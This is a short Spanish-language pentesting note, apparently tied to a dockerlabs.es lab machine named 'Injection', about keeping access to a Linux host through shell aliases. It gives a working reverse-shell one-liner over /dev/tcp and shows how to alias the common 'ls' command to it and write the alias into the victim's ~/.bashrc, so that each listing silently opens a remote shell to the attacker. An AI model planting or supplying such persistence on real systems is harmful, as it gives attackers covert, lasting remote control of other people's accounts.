- Tags: #persistencia #persistencia_linux #persistencia_alias

	**Recurso** : Maquina Injection dockerlabs.es

Creamos en la maquina como root o como el usuario comprometido un alias para que se establezca la conexion 
```bash

alias ls='bash -i >& /dev/tcp/ip/port 0>&1'
```

Aquí lo que ocurre es que si el usuario al que le creamos el alias ejecuta el alias se establece la conexion nuestra maquina

Para que sea persistente debemos crear el alias el el archivo bashrc o en la bash que utilice el usuario
```bash
nano ~/.bashrc

#agregamos

alias ls='bash -i >& /dev/tcp/ip/port 0>&1'

source ~/.bashrc
```